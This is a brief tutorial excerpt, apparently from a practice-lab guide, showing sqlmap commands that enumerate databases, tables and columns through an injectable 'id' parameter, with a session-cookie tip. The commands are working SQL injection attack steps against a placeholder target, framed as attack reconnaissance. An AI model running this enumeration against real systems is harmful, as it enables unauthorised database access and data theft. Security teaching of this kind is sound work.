SQLMap Commands for Enumeration
1# Enumerate databases
2sqlmap -u "http://example.com/vuln?id=1" --dbs
3
4# Enumerate tables in 'sqli_lab' database
5sqlmap -u "http://example.com/vuln?id=1" -D sqli_lab --tables
6
7# Enumerate columns in 'users' table within 'sqli_lab' database
8sqlmap -u "http://example.com/vuln?id=1" -D sqli_lab -T users --columns
Important Note

For authenticated sessions, remember to include the --cookie="security=low; PHPSESSID=<your_php_session_id>" option to maintain your session with the target application.

SQLMap in Action

Discovering Database Structure

Using SQLMap to list databases and tables on a target.

Enumerating Databases

Use the --dbs option to list all accessible databases on the target server after identifying a vulnerable parameter.

Enumerating Tables

Once a database is identified, use -D <database_name> --tables to list all tables within that specific database.

Key Takeaway

SQLMap provides powerful, easy-to-use commands for systematically mapping out the entire database schema, from databases to tables and columns, significantly accelerating the reconnaissance phase of an attack.
